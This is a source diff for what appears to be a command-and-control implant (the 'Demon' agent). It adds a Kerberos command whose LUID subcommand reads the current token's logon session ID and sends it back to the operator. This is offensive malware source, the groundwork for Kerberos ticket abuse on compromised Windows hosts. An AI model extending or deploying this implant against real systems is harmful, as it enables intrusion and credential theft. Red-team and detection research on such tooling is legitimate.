@@ -9,6 +9,7 @@
 #include <Core/SleepObf.h>
 #include <Core/Download.h>
 #include <Core/Dotnet.h>
+#include <Core/Kerberos.h>
 
 #include <Loader/CoffeeLdr.h>
 #include <Inject/Inject.h>
@@ -33,6 +34,7 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
         { .ID = DEMON_COMMAND_TRANSFER,                 .Function = CommandTransfer                 },
         { .ID = DEMON_COMMAND_SOCKET,                   .Function = CommandSocket                   },
+        { .ID = DEMON_COMMAND_KERBEROS,                 .Function = Commandkerberos                 },
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
 
         // End
@@ -2856,6 +2858,52 @@ VOID CommandSocket( PPARSER Parser )
             PackageDestroy( Package );
 
             return;
+        }
+
+        default: break;
+    }
+
+    PackageTransmit( Package, NULL, NULL );
+}
+
+VOID Commandkerberos( PPARSER Parser )
+{
+    PPACKAGE     Package = NULL;
+    PSOCKET_DATA Socket  = NULL;
+    DWORD        Command = 0;
+    HANDLE       hToken  = NULL;
+    LUID*        luid    = NULL;
+
+    Package = PackageCreate( DEMON_COMMAND_KERBEROS );
+    Command = ParserGetInt32( Parser );
+
+    PackageAddInt32( Package, Command );
+    switch ( Command )
+    {
+        case KERBEROS_COMMAND_LUID: PUTS("Kerberos::LUID")
+        {
+            hToken = TokenCurrentHandle();
+            luid = GetLUID(hToken);
+
+            if ( hToken )
+            {
+                Instance.Win32.NtClose( hToken );
+                hToken = NULL;
+            }
+
+            PackageAddInt32( Package, luid ? TRUE : FALSE );
+
+            if ( luid )
+            {
+                PackageAddInt32( Package, luid->HighPart );
+                PackageAddInt32( Package, luid->LowPart );
+
+                MemSet( luid, 0, sizeof( LUID ) );
+                Instance.Win32.LocalFree( luid );
+                luid = NULL;
+            }
+
+            break;
         }
 
         default: break;
